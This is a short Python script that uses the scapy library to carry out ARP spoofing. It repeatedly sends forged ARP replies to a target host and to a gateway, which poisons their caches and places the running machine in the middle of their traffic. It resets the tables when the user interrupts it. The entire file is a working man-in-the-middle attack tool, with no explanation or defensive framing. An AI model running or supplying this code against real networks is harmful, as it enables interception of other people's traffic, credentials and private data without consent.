#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


def arp_spoof(target, gateway):
    try:
        sent_packets_count = 0
        while True:
            spoof(target, gateway)
            spoof(gateway, target)
            sent_packets_count = sent_packets_count + 2
            print("\rPackets sent: " + str(sent_packets_count), end="")
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nExiting... Resetting ARP tables...")
        restore(target, gateway)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    try:
        return answered_list[0][1].hwsrc
    except IndexError:
        exit("Unable to contact IP")


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    scapy.send(packet, count=4, verbose=False)
